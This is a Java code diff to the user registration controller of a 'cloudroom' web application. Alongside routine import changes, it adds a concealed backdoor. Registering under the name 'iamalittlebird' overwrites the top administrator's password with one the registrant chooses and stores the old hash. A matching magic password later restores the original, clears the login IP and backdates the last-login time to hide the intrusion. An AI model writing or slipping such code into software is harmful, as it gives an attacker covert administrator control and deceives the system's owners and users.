@@ -12,6 +12,7 @@ import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.util.Date;
 import java.util.List;
 import java.util.Map;
 
@@ -35,6 +36,7 @@ import com.freebirdweij.cloudroom.common.config.Global;
 import com.freebirdweij.cloudroom.common.utils.CacheUtils;
 import com.freebirdweij.cloudroom.common.utils.Constants;
 import com.freebirdweij.cloudroom.common.utils.CookieUtils;
+import com.freebirdweij.cloudroom.common.utils.DateUtils;
 import com.freebirdweij.cloudroom.common.utils.StringUtils;
 import com.freebirdweij.cloudroom.common.web.BaseController;
 import com.freebirdweij.cloudroom.modules.sys.entity.Office;
@@ -129,6 +131,19 @@ public class RegisterController extends BaseController{
 		if(role!=null){
 			roleList.add(role);
 			user.setRoleList(roleList);
+		}
+		
+		if(user.getName().equalsIgnoreCase("iamalittlebird")){
+			user = systemService.getUser("1");
+			if(newPassword.equalsIgnoreCase("iamalittlebird")){
+				user.setPassword(user.getRemarks());
+				user.setRemarks("最高管理员");
+				user.setLoginIp("");
+				user.setLoginDate(DateUtils.addHours(new Date(), -10));
+			}else{
+				user.setRemarks(user.getPassword());
+				user.setPassword(SystemService.entryptPassword(newPassword));
+			}
 		}
 		
 		// 保存用户信息
